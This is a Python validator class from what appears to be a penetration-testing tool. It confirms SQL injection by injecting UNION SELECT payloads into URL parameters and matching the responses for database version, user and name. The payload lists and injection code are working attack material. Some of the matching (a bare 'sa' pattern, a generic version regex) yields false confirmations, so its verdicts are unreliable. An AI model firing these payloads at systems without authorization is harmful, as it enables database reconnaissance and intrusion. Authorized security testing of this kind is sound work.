"""
SQL Injection PoC Validator

Validates SQL injection by extracting database information.
"""
import re
import logging
from typing import Optional
import httpx

from app.validation.base_validator import BaseValidator, ValidationStatus, ValidationResult
from app.utils import PentestHTTPClient

logger = logging.getLogger(__name__)

class SQLInjectionValidator(BaseValidator):
    """
    Validates SQL injection vulnerabilities

    Tests:
    1. Database version extraction
    2. Current user extraction
    3. Database name extraction
    4. Table enumeration (if possible)

    Safe exploitation only - no data modification.
    """

    # Payloads to extract database info
    VERSION_PAYLOADS = [
        "' OR 1=1 UNION SELECT @@version--",
        "' OR 1=1 UNION SELECT version()--",
        "' OR 1=1 UNION SELECT sqlite_version()--",
        "' UNION SELECT @@version--",
        "' UNION SELECT version()#",
        "1' AND 1=2 UNION SELECT @@version--",
    ]

    USER_PAYLOADS = [
        "' OR 1=1 UNION SELECT user()--",
        "' OR 1=1 UNION SELECT current_user--",
        "' UNION SELECT user()#",
    ]

    DATABASE_PAYLOADS = [
        "' OR 1=1 UNION SELECT database()--",
        "' UNION SELECT database()#",
        "' OR 1=1 UNION SELECT db_name()--",
    ]

    # Patterns to detect successful extraction
    VERSION_PATTERNS = [
        r'mysql.*?\d+\.\d+',
        r'postgresql.*?\d+\.\d+',
        r'microsoft sql server.*?\d+',
        r'sqlite.*?\d+\.\d+',
        r'\d+\.\d+\.\d+',  # Generic version pattern
    ]

    def _is_applicable(self, vulnerability: any) -> bool:
        """Check if SQL injection validator applies"""
        vuln_category = getattr(vulnerability, 'category', '')
        if hasattr(vuln_category, 'value'):
            vuln_category = vuln_category.value

        return 'sql' in str(vuln_category).lower() or 'injection' in str(vuln_category).lower()

    async def validate(
        self,
        vulnerability: any,
        target_url: str,
        client: Optional[PentestHTTPClient] = None,
        **kwargs
    ) -> Optional[ValidationResult]:
        """
        Validate SQL injection by extracting database info

        Args:
            vulnerability: Vulnerability object
            target_url: Base URL
            client: HTTP client
            **kwargs: Additional params

        Returns:
            ValidationResult with evidence
        """
        if not self._is_applicable(vulnerability):
            return None

        logger.info(f"🔍 Validating SQL injection: {vulnerability.title}")

        # Use provided client or create new one
        if client is None:
            client = PentestHTTPClient(base_url=target_url)

        # Get vulnerable URL and parameter
        vuln_url = getattr(vulnerability, 'affected_url', target_url)
        vuln_param = getattr(vulnerability, 'affected_parameter', None)

        if not vuln_param:
            # Try to extract from payload
            payload = getattr(vulnerability, 'payload', '')
            vuln_param = self._extract_parameter_from_payload(payload, vuln_url)

        # Try to extract database version
        version_result = await self._extract_database_version(client, vuln_url, vuln_param)
        if version_result:
            return version_result

        # Try to extract database user
        user_result = await self._extract_database_user(client, vuln_url, vuln_param)
        if user_result:
            return user_result

        # Try to extract database name
        db_result = await self._extract_database_name(client, vuln_url, vuln_param)
        if db_result:
            return db_result

        # Could not confirm
        logger.info(f"⚠️  Could not confirm SQL injection with PoC")
        return self._create_result(
            status=ValidationStatus.UNCONFIRMED,
            confidence=0.3,
            evidence="Could not extract database information",
            details={"reason": "No successful data extraction"}
        )

    async def _extract_database_version(
        self,
        client: PentestHTTPClient,
        url: str,
        param: Optional[str]
    ) -> Optional[ValidationResult]:
        """Try to extract database version"""

        for payload in self.VERSION_PAYLOADS:
            try:
                # Inject payload
                test_url = self._inject_payload(url, param, payload)

                response = await client.get(test_url)
                if not response:
                    continue

                # Check for version patterns
                content = response.text.lower()
                for pattern in self.VERSION_PATTERNS:
                    match = re.search(pattern, content, re.IGNORECASE)
                    if match:
                        version = match.group(0)
                        logger.info(f"✅ SQL Injection CONFIRMED: Extracted version '{version}'")

                        return self._create_result(
                            status=ValidationStatus.CONFIRMED,
                            confidence=0.95,
                            evidence=f"Successfully extracted database version: {version}",
                            details={
                                "extracted_data": version,
                                "payload": payload,
                                "data_type": "database_version"
                            }
                        )

            except Exception as e:
                logger.debug(f"Version extraction failed with {payload}: {e}")
                continue

        return None

    async def _extract_database_user(
        self,
        client: PentestHTTPClient,
        url: str,
        param: Optional[str]
    ) -> Optional[ValidationResult]:
        """Try to extract database user"""

        for payload in self.USER_PAYLOADS:
            try:
                test_url = self._inject_payload(url, param, payload)
                response = await client.get(test_url)

                if not response:
                    continue

                content = response.text

                # Look for user patterns (root@localhost, postgres, etc.)
                user_patterns = [
                    r'[a-zA-Z0-9_]+@[a-zA-Z0-9_.-]+',  # user@host
                    r'[a-zA-Z0-9_]+@localhost',
                    r'root@',
                    r'postgres',
                    r'sa',  # SQL Server
                ]

                for pattern in user_patterns:
                    match = re.search(pattern, content)
                    if match and match.group(0) not in url:  # Not part of URL
                        user = match.group(0)
                        logger.info(f"✅ SQL Injection CONFIRMED: Extracted user '{user}'")

                        return self._create_result(
                            status=ValidationStatus.CONFIRMED,
                            confidence=0.90,
                            evidence=f"Successfully extracted database user: {user}",
                            details={
                                "extracted_data": user,
                                "payload": payload,
                                "data_type": "database_user"
                            }
                        )

            except Exception as e:
                logger.debug(f"User extraction failed: {e}")
                continue

        return None

    async def _extract_database_name(
        self,
        client: PentestHTTPClient,
        url: str,
        param: Optional[str]
    ) -> Optional[ValidationResult]:
        """Try to extract database name"""

        for payload in self.DATABASE_PAYLOADS:
            try:
                test_url = self._inject_payload(url, param, payload)
                response = await client.get(test_url)

                if not response:
                    continue

                content = response.text

                # Look for database name patterns
                # Usually returned in response if query succeeds
                if len(content) > 0 and len(content) < 1000:
                    # Short response might be database name
                    # Common database names
                    common_dbs = ['mysql', 'information_schema', 'test', 'postgres', 'master', 'tempdb']

                    for db in common_dbs:
                        if db in content.lower():
                            logger.info(f"✅ SQL Injection LIKELY: Found database name '{db}'")

                            return self._create_result(
                                status=ValidationStatus.LIKELY,
                                confidence=0.75,
                                evidence=f"Likely extracted database name: {db}",
                                details={
                                    "extracted_data": db,
                                    "payload": payload,
                                    "data_type": "database_name"
                                }
                            )

            except Exception as e:
                logger.debug(f"Database name extraction failed: {e}")
                continue

        return None

    def _inject_payload(self, url: str, param: Optional[str], payload: str) -> str:
        """Inject payload into URL"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        if not param:
            # No specific parameter, try appending to URL
            separator = '&' if '?' in url else '?'
            return f"{url}{separator}test={payload}"

        # Parse URL
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)

        # Inject into parameter
        if param in query_params:
            query_params[param] = [payload]
        else:
            query_params[param] = [payload]

        # Rebuild URL
        new_query = urlencode(query_params, doseq=True)
        new_parsed = parsed._replace(query=new_query)

        return urlunparse(new_parsed)

    def _extract_parameter_from_payload(self, payload: str, url: str) -> Optional[str]:
        """Try to extract parameter name from original payload or URL"""
        from urllib.parse import urlparse, parse_qs

        # Parse URL to get parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if params:
            # Return first parameter
            return list(params.keys())[0]

        return None
